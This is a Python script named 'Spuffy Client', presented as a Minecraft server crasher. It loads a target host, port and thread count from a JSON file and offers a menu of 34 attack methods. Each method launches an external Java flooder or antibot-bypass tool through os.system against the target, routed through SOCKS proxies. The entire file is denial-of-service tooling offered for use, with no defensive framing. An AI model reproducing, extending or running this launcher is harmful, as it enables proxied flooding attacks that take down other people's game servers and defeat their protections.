import json, os, sys, win32ui, time, ctypes, urllib
from colorama import Fore


def banner():
    os.system("cls")
    print(f"""{Fore.WHITE}          Spuffy Client by Tahg
░██████╗██████╗░██╗░░░██╗███████╗███████╗██╗░░░██╗  ░█████╗░██╗░░░░░██╗███████╗███╗░░██╗████████╗
██╔════╝██╔══██╗██║░░░██║██╔════╝██╔════╝╚██╗░██╔╝  ██╔══██╗██║░░░░░██║██╔════╝████╗░██║╚══██╔══╝
╚█████╗░██████╔╝██║░░░██║█████╗░░█████╗░░░╚████╔╝░  ██║░░╚═╝██║░░░░░██║█████╗░░██╔██╗██║░░░██║░░░
░╚═══██╗██╔═══╝░██║░░░██║██╔══╝░░██╔══╝░░░░╚██╔╝░░  ██║░░██╗██║░░░░░██║██╔══╝░░██║╚████║░░░██║░░░
██████╔╝██║░░░░░╚██████╔╝██║░░░░░██║░░░░░░░░██║░░░  ╚█████╔╝███████╗██║███████╗██║░╚███║░░░██║░░░
╚═════╝░╚═╝░░░░░░╚═════╝░╚═╝░░░░░╚═╝░░░░░░░░╚═╝░░░  ░╚════╝░╚══════╝╚═╝╚══════╝╚═╝░░╚══╝░░░╚═╝░░░
                                {Fore.RED}The Best Minecraft Crasher
    """)

def spuffycrasher():
    with open('creedentials.json') as x:
        br = json.load(x)
        pak = br.get('threads')
        host = br.get('server-IP')
        port = br.get('server-PORT')
        time = br.get('time')
    print()
    print()
    print(f"""{Fore.RESET}
{Fore.RED}· Dev {Fore.WHITE}Tahg

· {Fore.RED}ATTACKING {Fore.WHITE}{host}:{port} {Fore.RED}| {Fore.WHITE}{time}s

{Fore.GREEN}· MOST USED:
{Fore.RED}[A] {Fore.WHITE}AUTH  {Fore.RED}[B] {Fore.WHITE}INSTANT  {Fore.RED}[C] {Fore.WHITE}MCBREAK

{Fore.GREEN}· OTHERS:
{Fore.RED}[1] {Fore.WHITE}AUTH     {Fore.RED}[4] {Fore.WHITE}BYPASS   {Fore.WHITE}{Fore.RED}[7] {Fore.WHITE}EXTREME   {Fore.RED}[10] {Fore.WHITE}FLASH   {Fore.RED}[13] {Fore.WHITE}HANDSHAKE   {Fore.RED}[16] {Fore.WHITE}JOIN   {Fore.RED}[19] {Fore.WHITE}LVNN    {Fore.RED}[22] {Fore.WHITE}MOTD2    {Fore.RED}[25] {Fore.WHITE}PINGJOIN {Fore.RED}[28] {Fore.WHITE}PROBREAK {Fore.RED}[31] {Fore.WHITE}SMASHER   {Fore.RED}[34] {Fore.WHITE}ULTRA
{Fore.RED}[2] {Fore.WHITE}AUTH2    {Fore.RED}[5] {Fore.WHITE}BYPASS2  {Fore.WHITE}{Fore.RED}[8] {Fore.WHITE}EXTREME2  {Fore.RED}[11] {Fore.WHITE}FLOOD   {Fore.RED}[14] {Fore.WHITE}HARDSMASHER {Fore.RED}[17] {Fore.WHITE}JOIN2  {Fore.RED}[20] {Fore.WHITE}MCBREAK {Fore.RED}[23] {Fore.WHITE}NIMBLE   {Fore.RED}[26] {Fore.WHITE}POWER    {Fore.RED}[29] {Fore.WHITE}RCON     {Fore.RED}[32] {Fore.WHITE}ULTIMATE  {Fore.RED}[-]
{Fore.RED}[3] {Fore.WHITE}AVARION  {Fore.RED}[6] {Fore.WHITE}BYPASS3  {Fore.WHITE}{Fore.RED}[9] {Fore.WHITE}FIXLAGGER {Fore.RED}[12] {Fore.WHITE}FUCKER  {Fore.RED}[15] {Fore.WHITE}INSTANT     {Fore.RED}[18] {Fore.WHITE}LAGGER {Fore.RED}[21] {Fore.WHITE}MOTD    {Fore.RED}[24] {Fore.WHITE}NULLPING {Fore.RED}[27] {Fore.WHITE}POWER2   {Fore.RED}[30] {Fore.WHITE}RCON2    {Fore.RED}[33] {Fore.WHITE}ULTIMATE2 {Fore.RED}[0] {Fore.WHITE}EXIT

    """)
    booter = input(f"{Fore.RED}[$] {Fore.WHITE}")
    if booter == "A":
        os.system(f"cd .\methods && java -jar AUTH.jar {host} {port} {pak} 0 socks.txt")
    if booter == "B":
        os.system(f"cd .\methods && java -jar INSTANT.jar {host}:{port} 15 1000 0")
    if booter == "C":
        os.system(f"cd .\methods && java -jar MCBREAK.jar host={host} port={port} srvResolve=true svResolve2=false alwaysResolve=false threads={pak} connections=10000 multi=false removeFailure=true socksV4=true loopAmount=1900 timeout=2500 keepAlive=false proxiesType=socks print=false proxiesFile=socks.txt attackTime={time} exploit=extreme2")
    if booter == "1":
        os.system(f"cd .\methods && java -jar AUTH.jar {host}:{port} {pak} 0 socks.txt")
    if booter == "2":
        os.system(f"cd .\methods && java -jar AUTH2.jar host={host} port={port} pfile=socks.txt threads={pak} method=auth version=47 license=123ascqweq11")
    if booter == "3":
        os.system(f"cd .\methods && java -jar AVARION.jar host-{host} port-{port} threads-{pak}")
    if booter == "4":
        os.system(f"cd .\methods && java -jar BYPASS.jar {host}:{port} 2 {pak} 1 socks.txt 4")
    if booter == "5":
        os.system(f"cd .\methods && java -jar BYPASS2.jar host={host} port={port} pfile=socks.txt threads={pak} method=antibotdeluxe version=47 license=123ascqweq11")
    if booter == "6":
        os.system(f"cd .\methods && java -jar BYPASS3.jar host={host} port={port} pfile=socks.txt threads={pak} method=nantibot version=47 license=123ascqweq11")
    if booter == "7":
        os.system(f"cd .\methods && java -jar EXTREME.jar host={host} port={port} proxiesFile=socks.txt threads={pak} attackTime={time} exploit=byte1")
    if booter == "8":
        os.system(f"cd .\methods && java -jar EXTREME2.jar host={host} port={port} proxiesFile=socks.txt threads={pak} attackTime={time} exploit=byte2")
    if booter == "9":
        os.system(f"cd .\methods && java -jar FIXLAGGER.jar {host}:{port} {pak} 1 overload socks.txt")
    if booter == "10":
        os.system(f"cd .\methods && java -jar FLASH.jar host={host} port={port} pfile=socks.txt threads={pak} method=flasher version=47 license=123ascqweq11")
    if booter == "11":
        os.system(f"cd .\methods && java -jar FLOOD.jar host={host} port={port} pfile=socks.txt threads={pak} method=timeout version=754 license=123ascqweq11")
    if booter == "12":
        os.system(f"cd .\methods && java -jar FUCKER.jar {host}:{port} 14 {pak} 1 socks.txt 4")
    if booter == "13":
        os.system(f"cd .\methods && java -jar HANDSHAKE.jar host={host} port={port} pfile=socks.txt threads={pak} method=handshake version=47 license=123ascqweq11")
    if booter == "14":
        os.system(f"cd .\methods && java -jar HARDSMASHER.jar host={host} port={port} proxiesFile=socks.txt threads={pak} attackTime={time} exploit=abd")
    if booter == "15":
        os.system(f"cd .\methods && java -jar INSTANT.jar {host}:{port} 15 1000 0")
    if booter == "16":
        os.system(f"cd .\methods && java -jar JOIN.jar host={host} port={port} proxiesFile=socks.txt threads={pak} attackTime={time} exploit=join")
    if booter == "17":
        os.system(f"cd .\methods && java -jar JOIN2.jar host={host} port={port} pfile=socks.txt threads={pak} method=join version=47 license=123ascqweq11")
    if booter == "18":
        os.system(f"cd .\methods && java -jar LAGGER.jar -move true -ping false -pingamount 10 -host {host} -port {port} -threads {pak} -nicksize 16 -stay true -stayl 2000 -nicks RANDOM -spam true -ach true -joinamount 1 -doublej true -protocol 47 -msg !ExtremeHack -amount 10 -proxymode NONE -login /login 123123x -register /register 123123x 123123x -time {time} -debug true")
    if booter == "19":
        os.system(f"cd .\methods && java -jar LVNN.jar {host}:{port} {pak} 1 LVNN socks.txt s4")
    if booter == "20":
        os.system(f"cd .\methods && java -jar MCBREAK.jar host={host} port={port} srvResolve=true svResolve2=false alwaysResolve=false threads={pak} connections=10000 multi=false removeFailure=true socksV4=true loopAmount=1900 timeout=2500 keepAlive=false proxiesType=socks print=false proxiesFile=socks.txt attackTime={time} exploit=extreme2")
    if booter == "21":
        os.system(f"cd .\methods && timeout {pak} java -jar MOTD.jar {host}:{port} 15 1000 1")
    if booter == "22":
        os.system(f"cd .\methods && java -jar MOTD2.jar host={host} port={port} pfile=socks.txt threads={pak} method=motd version=47 license=123ascqweq11")
    if booter == "23":
        os.system(f"cd .\methods && java -jar NIMBLE.jar host={host} port={port} proxiesFile=socks.txt threads={pak} attackTime={time} exploit=utf16_join")
    if booter == "24":
        os.system(f"cd .\methods && java -jar NULLPING.jar host-{host} port-{port} threads-{pak}")
    if booter == "25":
        os.system(f"cd .\methods && java -jar PINGJOIN.jar host={host} port={port} pfile=socks.txt threads={pak} method=ping_join version=47 license=123ascqweq11")
    if booter == "26":
        os.system(f"cd .\methods && java -jar POWER.jar host={host} port={port} pfile=socks.txt threads={pak} method=aegis version=47 license=123ascqweq11")
    if booter == "27":
        os.system(f"cd .\methods && java -jar POWER2.jar host={host} port={port} pfile=socks.txt threads={pak} method=flamecord version=47 license=123ascqweq11")
    if booter == "28":
        os.system(f"cd .\methods && java -jar PROBREAK.jar {host} {port} {pak} 3 false")
    if booter == "29":
        os.system(f"cd .\methods && java -jar RCON.jar host={host} port={port} pfile=socks.txt threads={pak} method=spigot_1 version=754 license=123ascqweq11")
    if booter == "30":
        os.system(f"cd .\methods && java -jar RCON2.jar host={host} port={port} pfile=socks.txt threads={pak} method=spigot_2 version=754 license=123ascqweq11")
    if booter == "31":
        os.system(f"cd .\methods && java -jar SMASHER.jar host-{host} port-{port} socks.txt proxymode-socks threads-{pak} loop-700 debug-true time-{time}")
    if booter == "32":
        os.system(f"cd .\methods && java -jar ULTIMATE.jar host={host} port={port} proxiesFile=socks.txt threads={pak} attackTime={time} exploit=nAntibot")
    if booter == "33":
        os.system(f"cd .\methods && java -jar ULTIMATE2.jar host={host} port={port} pfile=socks.txt threads={pak} method=spigot_2 version=754 license=123ascqweq11")
    if booter == "34":
        os.system(f"cd .\methods && java -jar ULTRA.jar host={host} port={port} proxiesFile=socks.txt threads={pak} attackTime={time} exploit=queue")
    if booter == "0":
        print(f"{Fore.RED}[-] {Fore.WHITE}Exiting...")
        sys.exit()
    else:
        print(f"{Fore.RED}[-] {Fore.WHITE}Invalid...")
        time.sleep(1.5)
        spuffycrasher()

if __name__=="__main__":
    ctypes.windll.kernel32.SetConsoleTitleW(f'Spuffy Client | The Best Minecraft Crasher - Developed by Tahg')
    banner()
    spuffycrasher()
